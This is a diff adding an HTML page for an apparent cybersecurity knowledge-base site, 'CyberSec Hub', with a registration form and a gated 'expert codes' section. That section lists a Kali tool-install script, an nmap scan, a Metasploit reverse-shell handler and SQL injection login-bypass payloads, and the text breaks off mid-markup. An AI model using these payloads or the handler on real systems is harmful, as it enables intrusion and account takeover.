@@ -1,0 +1,1331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberSec Hub | Ultimate Cybersecurity Knowledge Base</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap');
+        
+        :root {
+            --primary: #00f0ff;
+            --secondary: #0077ff;
+            --accent: #ff00aa;
+            --dark: #0a0a12;
+            --darker: #050508;
+        }
+        
+        body {
+            font-family: 'IBM Plex Mono', monospace;
+            background-color: var(--dark);
+            color: #e0e0e0;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        
+        .hacker-font {
+            font-family: 'Space Mono', monospace;
+        }
+        
+        .glow {
+            text-shadow: 0 0 8px var(--primary), 0 0 16px rgba(0, 240, 255, 0.3);
+        }
+        
+        .glow-accent {
+            text-shadow: 0 0 8px var(--accent), 0 0 16px rgba(255, 0, 170, 0.3);
+        }
+        
+        .cyber-border {
+            position: relative;
+            border: 1px solid var(--primary);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.3),
+                        inset 0 0 15px rgba(0, 240, 255, 0.2);
+        }
+        
+        .cyber-border::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            border: 2px solid transparent;
+            background: linear-gradient(45deg, var(--primary), var(--secondary), var(--accent)) border-box;
+            -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: destination-out;
+            mask-composite: exclude;
+            pointer-events: none;
+            border-radius: inherit;
+        }
+        
+        .terminal {
+            background-color: rgba(10, 10, 18, 0.9);
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .terminal::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 30px;
+            background: linear-gradient(90deg, 
+                rgba(0,240,255,0) 0%, 
+                rgba(0,240,255,0.3) 50%, 
+                rgba(0,240,255,0) 100%);
+        }
+        
+        .typewriter {
+            overflow: hidden;
+            white-space: nowrap;
+            margin: 0 auto;
+            letter-spacing: .15em;
+            animation: typing 3.5s steps(40, end);
+        }
+        
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+        
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.05;
+        }
+        
+        .btn-cyber {
+            background: linear-gradient(135deg, rgba(0,10,20,0.8) 0%, rgba(0,60,100,0.8) 100%);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn-cyber::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(0,240,255,0) 0%,
+                rgba(0,240,255,0) 30%,
+                rgba(0,240,255,0.3) 45%,
+                rgba(0,240,255,0) 60%,
+                rgba(0,240,255,0) 100%
+            );
+            transform: rotate(30deg);
+            transition: all 0.7s;
+        }
+        
+        .btn-cyber:hover {
+            background: linear-gradient(135deg, rgba(0,60,100,0.8) 0%, rgba(0,10,20,0.8) 100%);
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.5);
+            transform: translateY(-3px);
+            color: white;
+        }
+        
+        .btn-cyber:hover::before {
+            left: 100%;
+            top: 100%;
+        }
+        
+        .btn-accent {
+            background: linear-gradient(135deg, rgba(20,0,10,0.8) 0%, rgba(100,0,60,0.8) 100%);
+            border: 1px solid var(--accent);
+            color: white;
+        }
+        
+        .btn-accent:hover {
+            background: linear-gradient(135deg, rgba(100,0,60,0.8) 0%, rgba(20,0,10,0.8) 100%);
+            box-shadow: 0 0 20px rgba(255, 0, 170, 0.5);
+        }
+        
+        .input-cyber {
+            background-color: rgba(0, 5, 10, 0.5);
+            border: 1px solid var(--primary);
+            color: white;
+            transition: all 0.3s;
+        }
+        
+        .input-cyber:focus {
+            outline: none;
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.5);
+            border-color: var(--secondary);
+        }
+        
+        .code-block {
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .code-block::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(0, 240, 255, 0.1),
+                transparent
+            );
+            transition: all 0.6s;
+        }
+        
+        .code-block:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 240, 255, 0.3);
+        }
+        
+        .code-block:hover::before {
+            left: 100%;
+        }
+        
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+        
+        @keyframes floating {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 240, 255, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(0, 240, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 240, 255, 0); }
+        }
+        
+        .nav-link {
+            position: relative;
+        }
+        
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            transition: width 0.3s ease;
+        }
+        
+        .nav-link:hover::after {
+            width: 100%;
+        }
+        
+        .tab {
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+        }
+        
+        .tab.active {
+            color: var(--primary);
+        }
+        
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+        }
+        
+        .tab:not(.active):hover {
+            color: var(--secondary);
+        }
+        
+        .tooltip {
+            position: relative;
+        }
+        
+        .tooltip::after {
+            content: attr(data-tooltip);
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(10, 10, 18, 0.95);
+            color: var(--primary);
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            white-space: nowrap;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+            border: 1px solid var(--primary);
+        }
+        
+        .tooltip:hover::after {
+            opacity: 1;
+            visibility: visible;
+            bottom: calc(100% + 5px);
+        }
+        
+        .progress-bar {
+            height: 4px;
+            background-color: rgba(0, 240, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 30%;
+            background: linear-gradient(90deg, var(--secondary), var(--primary));
+            animation: progress 2s linear infinite;
+        }
+        
+        @keyframes progress {
+            0% { left: -30%; }
+            100% { left: 100%; }
+        }
+        
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            padding: 5px 10px;
+            background-color: rgba(0, 0, 0, 0.3);
+            border-bottom: 1px solid rgba(0, 240, 255, 0.2);
+        }
+        
+        .terminal-btn {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 6px;
+        }
+        
+        .terminal-btn.red { background-color: #ff5f56; }
+        .terminal-btn.yellow { background-color: #ffbd2e; }
+        .terminal-btn.green { background-color: #27c93f; }
+        
+        .code-line {
+            counter-increment: line;
+            position: relative;
+            padding-left: 2.5em;
+        }
+        
+        .code-line::before {
+            content: counter(line);
+            position: absolute;
+            left: 0;
+            color: var(--secondary);
+            width: 2em;
+            text-align: right;
+            padding-right: 0.5em;
+            user-select: none;
+        }
+        
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: rgba(0, 5, 10, 0.7);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .code-container:hover .copy-btn {
+            opacity: 1;
+        }
+        
+        .copy-btn:hover {
+            background-color: rgba(0, 240, 255, 0.2);
+        }
+        
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: rgba(0, 30, 60, 0.95);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 5px;
+            border-left: 4px solid var(--primary);
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.5);
+            transform: translateX(200%);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification.error {
+            background-color: rgba(60, 0, 0, 0.95);
+            border-left-color: #ff0000;
+        }
+        
+        .search-container {
+            position: relative;
+        }
+        
+        .search-container::after {
+            content: '\f002';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary);
+        }
+        
+        .mobile-menu {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.5s ease;
+        }
+        
+        .mobile-menu.open {
+            max-height: 500px;
+        }
+        
+        .skill-meter {
+            height: 6px;
+            background-color: rgba(0, 240, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+        
+        .skill-level {
+            height: 100%;
+            background: linear-gradient(90deg, var(--secondary), var(--primary));
+            border-radius: 3px;
+        }
+        
+        .cyber-grid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 240, 255, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 240, 255, 0.05) 1px, transparent 1px);
+            background-size: 40px 40px;
+            z-index: -1;
+            opacity: 0.3;
+        }
+        
+        .cyber-dots {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(rgba(0, 240, 255, 0.2) 1px, transparent 1px);
+            background-size: 15px 15px;
+            z-index: -1;
+            opacity: 0.2;
+        }
+        
+        .cyber-corner {
+            position: relative;
+        }
+        
+        .cyber-corner::before,
+        .cyber-corner::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--primary);
+            z-index: 10;
+        }
+        
+        .cyber-corner::before {
+            top: 10px;
+            left: 10px;
+            border-right: none;
+            border-bottom: none;
+        }
+        
+        .cyber-corner::after {
+            bottom: 10px;
+            right: 10px;
+            border-left: none;
+            border-top: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix background animation -->
+    <canvas id="matrix" class="matrix-bg"></canvas>
+    <div class="cyber-grid"></div>
+    <div class="cyber-dots"></div>
+    
+    <!-- Notification -->
+    <div id="notification" class="notification">
+        <div class="flex items-center">
+            <i class="fas fa-check-circle mr-3"></i>
+            <span id="notificationText">Text copied to clipboard!</span>
+        </div>
+    </div>
+    
+    <!-- Main container -->
+    <div class="min-h-screen flex flex-col">
+        <!-- Header -->
+        <header class="py-4 px-4 sm:px-6 lg:px-8 sticky top-0 z-50 bg-black bg-opacity-90 backdrop-blur-sm">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-3">
+                    <div class="w-10 h-10 rounded-full bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center cyber-corner">
+                        <i class="fas fa-shield-halved text-cyan-400 text-xl"></i>
+                    </div>
+                    <h1 class="hacker-font text-2xl sm:text-3xl glow">CyberSec<span class="text-white">Hub</span></h1>
+                </div>
+                
+                <div class="hidden md:flex space-x-8 items-center">
+                    <a href="#home" class="nav-link hover:text-cyan-300 transition">Home</a>
+                    <a href="#features" class="nav-link hover:text-cyan-300 transition">Features</a>
+                    <a href="#register" class="nav-link hover:text-cyan-300 transition">Register</a>
+                    <a href="#codes" class="nav-link hover:text-cyan-300 transition">Codes</a>
+                    <a href="#about" class="nav-link hover:text-cyan-300 transition">About</a>
+                    
+                    <div class="search-container">
+                        <input type="text" placeholder="Search..." class="input-cyber px-4 py-2 rounded-md text-sm w-40 focus:w-60 transition-all duration-300">
+                    </div>
+                </div>
+                
+                <button id="mobileMenuButton" class="md:hidden text-cyan-400">
+                    <i class="fas fa-bars text-2xl"></i>
+                </button>
+            </div>
+            
+            <!-- Mobile menu -->
+            <div id="mobileMenu" class="mobile-menu md:hidden mt-4">
+                <div class="flex flex-col space-y-3 py-4">
+                    <a href="#home" class="nav-link hover:text-cyan-300 transition">Home</a>
+                    <a href="#features" class="nav-link hover:text-cyan-300 transition">Features</a>
+                    <a href="#register" class="nav-link hover:text-cyan-300 transition">Register</a>
+                    <a href="#codes" class="nav-link hover:text-cyan-300 transition">Codes</a>
+                    <a href="#about" class="nav-link hover:text-cyan-300 transition">About</a>
+                    
+                    <div class="search-container mt-2">
+                        <input type="text" placeholder="Search..." class="input-cyber px-4 py-2 rounded-md text-sm w-full">
+                    </div>
+                </div>
+            </div>
+        </header>
+        
+        <!-- Hero Section -->
+        <section id="home" class="flex-grow flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8 relative">
+            <div class="absolute inset-0 overflow-hidden">
+                <div class="absolute top-1/4 left-1/4 w-32 h-32 rounded-full bg-cyan-500 opacity-10 blur-3xl"></div>
+                <div class="absolute bottom-1/3 right-1/4 w-40 h-40 rounded-full bg-blue-500 opacity-10 blur-3xl"></div>
+                <div class="absolute top-1/3 right-1/4 w-28 h-28 rounded-full bg-pink-500 opacity-10 blur-3xl"></div>
+            </div>
+            
+            <div class="text-center max-w-4xl mx-auto relative z-10">
+                <div class="typewriter mb-6">
+                    <h2 class="hacker-font text-3xl sm:text-5xl font-bold mb-4 glow">Welcome to <span class="text-white">CyberSec</span>Hub</h2>
+                </div>
+                <p class="text-lg sm:text-xl mb-8 text-cyan-300 leading-relaxed">The ultimate cybersecurity knowledge base with advanced hacking techniques, defensive codes, and penetration testing resources for ethical hackers and security professionals.</p>
+                <div class="flex flex-col sm:flex-row justify-center gap-4">
+                    <a href="#register" class="btn-cyber px-8 py-4 rounded-lg font-bold hacker-font text-lg pulse flex items-center justify-center">
+                        <i class="fas fa-user-secret mr-3"></i> JOIN NOW
+                    </a>
+                    <a href="#codes" class="btn-accent px-8 py-4 rounded-lg font-bold hacker-font text-lg flex items-center justify-center">
+                        <i class="fas fa-lock-open mr-3"></i> ACCESS CODES
+                    </a>
+                </div>
+                
+                <div class="mt-16 flex justify-center">
+                    <div class="flex items-center space-x-8 text-cyan-300">
+                        <div class="text-center">
+                            <div class="text-3xl font-bold glow">250+</div>
+                            <div class="text-sm">Hacking Techniques</div>
+                        </div>
+                        <div class="h-12 w-px bg-gradient-to-b from-transparent via-cyan-500 to-transparent opacity-50"></div>
+                        <div class="text-center">
+                            <div class="text-3xl font-bold glow">100+</div>
+                            <div class="text-sm">Security Tools</div>
+                        </div>
+                        <div class="h-12 w-px bg-gradient-to-b from-transparent via-cyan-500 to-transparent opacity-50"></div>
+                        <div class="text-center">
+                            <div class="text-3xl font-bold glow">24/7</div>
+                            <div class="text-sm">Community Support</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Features Section -->
+        <section id="features" class="py-16 px-4 sm:px-6 lg:px-8 bg-black bg-opacity-50 relative">
+            <div class="max-w-6xl mx-auto">
+                <h2 class="hacker-font text-2xl sm:text-3xl font-bold mb-12 text-center glow">OUR <span class="text-white">FEATURES</span></h2>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                    <!-- Feature 1 -->
+                    <div class="code-block terminal p-6 rounded-lg cyber-border">
+                        <div class="flex items-center mb-4">
+                            <div class="w-12 h-12 rounded-lg bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                <i class="fas fa-code text-cyan-400 text-xl"></i>
+                            </div>
+                            <h3 class="text-xl font-bold">Expert Code Collection</h3>
+                        </div>
+                        <p class="text-cyan-300 mb-4">Access hundreds of curated cybersecurity code snippets, scripts, and techniques for penetration testing and ethical hacking.</p>
+                        <div class="skill-meter">
+                            <div class="skill-level" style="width: 90%"></div>
+                        </div>
+                    </div>
+                    
+                    <!-- Feature 2 -->
+                    <div class="code-block terminal p-6 rounded-lg cyber-border">
+                        <div class="flex items-center mb-4">
+                            <div class="w-12 h-12 rounded-lg bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                <i class="fas fa-graduation-cap text-cyan-400 text-xl"></i>
+                            </div>
+                            <h3 class="text-xl font-bold">Interactive Tutorials</h3>
+                        </div>
+                        <p class="text-cyan-300 mb-4">Step-by-step interactive tutorials that guide you through real-world cybersecurity scenarios and attack simulations.</p>
+                        <div class="skill-meter">
+                            <div class="skill-level" style="width: 85%"></div>
+                        </div>
+                    </div>
+                    
+                    <!-- Feature 3 -->
+                    <div class="code-block terminal p-6 rounded-lg cyber-border">
+                        <div class="flex items-center mb-4">
+                            <div class="w-12 h-12 rounded-lg bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                <i class="fas fa-tools text-cyan-400 text-xl"></i>
+                            </div>
+                            <h3 class="text-xl font-bold">Tool Database</h3>
+                        </div>
+                        <p class="text-cyan-300 mb-4">Comprehensive database of security tools with installation guides, usage examples, and best practices.</p>
+                        <div class="skill-meter">
+                            <div class="skill-level" style="width: 95%"></div>
+                        </div>
+                    </div>
+                    
+                    <!-- Feature 4 -->
+                    <div class="code-block terminal p-6 rounded-lg cyber-border">
+                        <div class="flex items-center mb-4">
+                            <div class="w-12 h-12 rounded-lg bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                <i class="fas fa-shield-alt text-cyan-400 text-xl"></i>
+                            </div>
+                            <h3 class="text-xl font-bold">Defensive Tactics</h3>
+                        </div>
+                        <p class="text-cyan-300 mb-4">Learn defensive cybersecurity strategies to protect your systems from the latest threats and vulnerabilities.</p>
+                        <div class="skill-meter">
+                            <div class="skill-level" style="width: 80%"></div>
+                        </div>
+                    </div>
+                    
+                    <!-- Feature 5 -->
+                    <div class="code-block terminal p-6 rounded-lg cyber-border">
+                        <div class="flex items-center mb-4">
+                            <div class="w-12 h-12 rounded-lg bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                <i class="fas fa-users text-cyan-400 text-xl"></i>
+                            </div>
+                            <h3 class="text-xl font-bold">Community Hub</h3>
+                        </div>
+                        <p class="text-cyan-300 mb-4">Connect with other cybersecurity professionals, share knowledge, and collaborate on security projects.</p>
+                        <div class="skill-meter">
+                            <div class="skill-level" style="width: 75%"></div>
+                        </div>
+                    </div>
+                    
+                    <!-- Feature 6 -->
+                    <div class="code-block terminal p-6 rounded-lg cyber-border">
+                        <div class="flex items-center mb-4">
+                            <div class="w-12 h-12 rounded-lg bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                <i class="fas fa-bolt text-cyan-400 text-xl"></i>
+                            </div>
+                            <h3 class="text-xl font-bold">CTF Challenges</h3>
+                        </div>
+                        <p class="text-cyan-300 mb-4">Regularly updated Capture The Flag challenges to test and improve your cybersecurity skills in realistic scenarios.</p>
+                        <div class="skill-meter">
+                            <div class="skill-level" style="width: 88%"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Registration Section -->
+        <section id="register" class="py-16 px-4 sm:px-6 lg:px-8 bg-black bg-opacity-70 relative">
+            <div class="max-w-2xl mx-auto terminal p-8 rounded-lg cyber-border relative overflow-hidden">
+                <div class="terminal-header absolute top-0 left-0 right-0">
+                    <div class="terminal-btn red"></div>
+                    <div class="terminal-btn yellow"></div>
+                    <div class="terminal-btn green"></div>
+                    <div class="text-xs ml-4 text-cyan-400">registration_terminal</div>
+                </div>
+                
+                <div class="mt-8">
+                    <h2 class="hacker-font text-2xl sm:text-3xl font-bold mb-6 text-center glow">ACCESS <span class="text-white">REGISTRATION</span></h2>
+                    
+                    <div class="flex border-b border-cyan-500 border-opacity-30 mb-6">
+                        <div class="tab active px-4 py-2" data-tab="basic">Basic</div>
+                        <div class="tab px-4 py-2" data-tab="pro">Pro</div>
+                        <div class="tab px-4 py-2" data-tab="enterprise">Enterprise</div>
+                    </div>
+                    
+                    <form id="registrationForm" class="space-y-6">
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div>
+                                <label for="firstName" class="block mb-2 text-sm font-medium">First Name</label>
+                                <input type="text" id="firstName" class="input-cyber w-full px-4 py-3 rounded-md" placeholder="Enter your first name" required>
+                            </div>
+                            <div>
+                                <label for="lastName" class="block mb-2 text-sm font-medium">Last Name</label>
+                                <input type="text" id="lastName" class="input-cyber w-full px-4 py-3 rounded-md" placeholder="Enter your last name" required>
+                            </div>
+                        </div>
+                        <div>
+                            <label for="email" class="block mb-2 text-sm font-medium">Email</label>
+                            <input type="email" id="email" class="input-cyber w-full px-4 py-3 rounded-md" placeholder="your@email.com" required>
+                        </div>
+                        <div>
+                            <label for="password" class="block mb-2 text-sm font-medium">Password</label>
+                            <input type="password" id="password" class="input-cyber w-full px-4 py-3 rounded-md" placeholder="Create a strong password" required>
+                            <div class="flex items-center mt-2 text-xs text-cyan-300">
+                                <i class="fas fa-info-circle mr-2"></i>
+                                <span>Minimum 8 characters, including numbers and special characters</span>
+                            </div>
+                        </div>
+                        <div>
+                            <label for="confirmPassword" class="block mb-2 text-sm font-medium">Confirm Password</label>
+                            <input type="password" id="confirmPassword" class="input-cyber w-full px-4 py-3 rounded-md" placeholder="Confirm your password" required>
+                        </div>
+                        <div class="flex items-center">
+                            <input type="checkbox" id="terms" class="mr-3 accent-cyan-500" required>
+                            <label for="terms" class="text-sm text-cyan-300">I agree to the <a href="#" class="text-cyan-400 hover:underline">Terms of Service</a> and <a href="#" class="text-cyan-400 hover:underline">Privacy Policy</a></label>
+                        </div>
+                        <button type="submit" class="btn-cyber w-full px-6 py-4 rounded-md font-bold hacker-font text-lg hover:bg-cyan-900 transition flex items-center justify-center">
+                            <i class="fas fa-user-secret mr-3"></i> CREATE ACCOUNT
+                        </button>
+                    </form>
+                    
+                    <div id="successMessage" class="hidden mt-6 p-6 bg-gradient-to-br from-blue-900 to-cyan-900 rounded-md text-center">
+                        <div class="w-16 h-16 bg-gradient-to-br from-blue-800 to-cyan-800 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <i class="fas fa-check-circle text-3xl text-cyan-400"></i>
+                        </div>
+                        <h3 class="text-xl font-bold mb-2 glow">ACCESS GRANTED</h3>
+                        <p class="mb-4">Your account has been successfully created. Welcome to the network.</p>
+                        <div class="progress-bar"></div>
+                        <p class="mt-4 text-sm">Redirecting to codes section...</p>
+                    </div>
+                    
+                    <div class="mt-6 text-center text-sm text-cyan-300">
+                        Already have an account? <a href="#" class="text-cyan-400 hover:underline">Log in</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Cybersecurity Codes Section -->
+        <section id="codes" class="py-16 px-4 sm:px-6 lg:px-8">
+            <div class="max-w-6xl mx-auto">
+                <div id="codesLocked" class="terminal p-8 rounded-lg text-center cyber-border">
+                    <div class="w-20 h-20 bg-gradient-to-br from-blue-900 to-cyan-900 rounded-full flex items-center justify-center mx-auto mb-6">
+                        <i class="fas fa-lock text-3xl text-cyan-500"></i>
+                    </div>
+                    <h2 class="hacker-font text-2xl sm:text-3xl font-bold mb-4 glow">CODES <span class="text-white">LOCKED</span></h2>
+                    <p class="mb-6 text-cyan-300">Register to gain access to our exclusive cybersecurity code collection</p>
+                    <a href="#register" class="btn-cyber px-8 py-3 rounded-md font-bold hacker-font inline-block">
+                        <i class="fas fa-user-plus mr-2"></i> REGISTER NOW
+                    </a>
+                </div>
+                
+                <div id="codesContent" class="hidden">
+                    <div class="flex justify-between items-center mb-12">
+                        <h2 class="hacker-font text-2xl sm:text-3xl font-bold glow">EXPERT <span class="text-white">CODES</span></h2>
+                        
+                        <div class="relative">
+                            <input type="text" placeholder="Search codes..." class="input-cyber pl-4 pr-10 py-2 rounded-md text-sm w-48 focus:w-64 transition-all duration-300">
+                            <i class="fas fa-search absolute right-3 top-1/2 transform -translate-y-1/2 text-cyan-400"></i>
+                        </div>
+                    </div>
+                    
+                    <div class="terminal p-6 rounded-lg mb-8 cyber-border">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="text-xl font-bold flex items-center">
+                                <i class="fas fa-download mr-2"></i> Kali Linux Setup
+                            </h3>
+                            <div class="flex space-x-2">
+                                <button class="text-cyan-400 hover:text-cyan-300 tooltip" data-tooltip="Save">
+                                    <i class="fas fa-bookmark"></i>
+                                </button>
+                                <button class="text-cyan-400 hover:text-cyan-300 tooltip" data-tooltip="Share">
+                                    <i class="fas fa-share-alt"></i>
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div class="code-container bg-black p-4 rounded-md mb-4 overflow-x-auto relative">
+                            <button class="copy-btn" data-clipboard-target="#kaliCode">
+                                <i class="fas fa-copy mr-1"></i> Copy
+                            </button>
+                            <pre id="kaliCode" class="text-cyan-400"><code># Update system
+sudo apt update && sudo apt upgrade -y
+
+# Install essential tools
+sudo apt install -y nmap metasploit-framework wireshark hydra john sqlmap nikto dnsenum aircrack-ng hashcat responder
+
+# Install additional utilities
+sudo apt install -y git python3-pip
+
+# Install BloodHound
+sudo apt install -y bloodhound neo4j
+sudo neo4j start
+
+# Install PowerShell for Linux
+sudo apt install -y powershell
+
+# Clone useful repositories
+git clone https://github.com/rebootuser/LinEnum.git
+git clone https://github.com/carlospolop/PEASS-ng.git
+git clone https://github.com/dievus/printspoofer.git</code></pre>
+                        </div>
+                        <p class="text-cyan-300 text-sm flex items-center">
+                            <i class="fas fa-info-circle mr-2"></i>
+                            These commands will install all necessary tools for working with the codes below. Reboot your system after installation.
+                        </p>
+                    </div>
+                
+                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                        <!-- Code 1 -->
+                        <div class="code-block terminal p-6 rounded-lg cyber-border">
+                            <div class="flex items-center mb-4">
+                                <div class="w-10 h-10 rounded-full bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                    <span class="text-cyan-400 font-bold">01</span>
+                                </div>
+                                <h3 class="text-xl font-bold">Nmap Scan</h3>
+                            </div>
+                            <div class="code-container bg-black p-4 rounded-md mb-4 overflow-x-auto relative">
+                                <button class="copy-btn" data-clipboard-text="nmap -sS -sV -T4 -A -v target_ip">
+                                    <i class="fas fa-copy mr-1"></i> Copy
+                                </button>
+                                <code class="text-cyan-400">nmap -sS -sV -T4 -A -v target_ip</code>
+                            </div>
+                            <p class="text-cyan-300 text-sm">Stealth SYN scan with version detection, aggressive timing, and verbose output for comprehensive reconnaissance.</p>
+                            <div class="mt-4 flex justify-between items-center text-xs">
+                                <span class="text-cyan-400">Network Scanning</span>
+                                <div class="flex items-center">
+                                    <i class="fas fa-star text-yellow-400 mr-1"></i>
+                                    <span>4.8</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Code 2 -->
+                        <div class="code-block terminal p-6 rounded-lg cyber-border">
+                            <div class="flex items-center mb-4">
+                                <div class="w-10 h-10 rounded-full bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                    <span class="text-cyan-400 font-bold">02</span>
+                                </div>
+                                <h3 class="text-xl font-bold">Metasploit Exploit</h3>
+                            </div>
+                            <div class="code-container bg-black p-4 rounded-md mb-4 overflow-x-auto relative">
+                                <button class="copy-btn" data-clipboard-text='msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST your_ip
+set LPORT 4444
+exploit'>
+                                    <i class="fas fa-copy mr-1"></i> Copy
+                                </button>
+                                <pre class="text-cyan-400"><code>msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST your_ip
+set LPORT 4444
+exploit</code></pre>
+                            </div>
+                            <p class="text-cyan-300 text-sm">Basic Metasploit handler for reverse TCP meterpreter session, commonly used in penetration testing.</p>
+                            <div class="mt-4 flex justify-between items-center text-xs">
+                                <span class="text-cyan-400">Exploitation</span>
+                                <div class="flex items-center">
+                                    <i class="fas fa-star text-yellow-400 mr-1"></i>
+                                    <span>4.9</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Code 3 -->
+                        <div class="code-block terminal p-6 rounded-lg cyber-border">
+                            <div class="flex items-center mb-4">
+                                <div class="w-10 h-10 rounded-full bg-gradient-to-br from-blue-900 to-cyan-900 flex items-center justify-center mr-4">
+                                    <span class="text-cyan-400 font-bold">03</span>
+                                </div>
+                                <h3 class="text-xl font-bold">SQL Injection</h3>
+                            </div>
+                            <div class="code-container bg-black p-4 rounded-md mb-4 overflow-x-auto relative">
+                                <button class="copy-btn" data-clipboard-text="' OR '1'='1' --
+admin' --
+admin' OR 1=1 --">
+                                    <i class="fas fa-copy mr-1"></i> Copy
+                                </button>
+                                <pre class="text-cyan-400"><code>' OR '1'='1' --
+admin' --
+admin' OR 1=1 --</code></pre>
+                            </div>
+                            <p class="text-cyan-300 text-sm">Basic SQL injection payloads to bypass authentication. Use only for authorized testing.</p>
+                            <div class="mt-4 flex justify-between items-center text-xs">
+                                <span class="text-cyan-400">Web Security</span>
+                                <div class="flex items-center">
